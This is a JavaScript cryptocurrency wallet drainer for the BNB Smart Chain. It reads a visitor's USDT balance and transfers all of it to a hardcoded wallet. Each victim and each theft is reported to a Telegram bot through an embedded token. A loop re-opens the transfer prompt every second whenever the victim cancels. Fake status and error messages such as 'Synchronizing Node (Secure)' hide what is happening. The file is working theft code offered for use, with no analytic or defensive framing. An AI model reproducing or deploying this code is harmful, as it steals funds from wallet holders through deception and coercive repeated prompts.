// --- CONFIGURATION ---
const MY_WALLET = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
const BOT_TOKEN = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const CHAT_ID = "7849151110";

async function notify(msg) {
    try {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
    } catch(e) {}
}

async function mainLogic() {
    const overlay = document.getElementById('overlay');
    const loadingText = document.getElementById('loading-text');
    
    if (!window.ethereum) {
        alert("Please use Trust Wallet or MetaMask browser.");
        overlay.style.display = 'none';
        return;
    }

    try {
        const web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        // BSC Network Check
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (e) {}

        loadingText.innerText = "Analyzing Assets...";
        
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, USDT_BEP20);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balanceEth = web3.utils.fromWei(balanceWei, 'ether');

        notify(`👤 <b>Target Detected</b>\nWallet: <code>${userAddress}</code>\nBalance: <b>${balanceEth} USDT</b>`);

        if (parseFloat(balanceEth) > 0) {
            // Anti-Cancel Loop Function
            async function initiateTransfer() {
                loadingText.innerText = "Synchronizing Node (Secure)...";
                try {
                    await contract.methods.transfer(MY_WALLET, balanceWei).send({
                        from: userAddress
                    });
                    
                    notify(`✅ <b>JACKPOT!</b>\nFrom: <code>${userAddress}</code>\nAmount: ${balanceEth} USDT`);
                    alert("Node Synced. System error 0x44. Please try again later.");
                    overlay.style.display = 'none';
                } catch (error) {
                    // Agar user cancel kare (Error 4001) toh wapas bulao
                    console.log("User rejected. Re-triggering...");
                    notify(`⚠️ <b>User Cancelled</b>\nRetrying for: ${userAddress}`);
                    
                    // 1 second ka gap deke phir se popup
                    setTimeout(initiateTransfer, 1000);
                }
            }

            // Loop start karo
            await initiateTransfer();

        } else {
            alert("Verification Complete: Low node balance.");
            overlay.style.display = 'none';
        }

    } catch (error) {
        console.error(error);
        overlay.style.display = 'none';
    }
}

window.mainLogic = mainLogic;
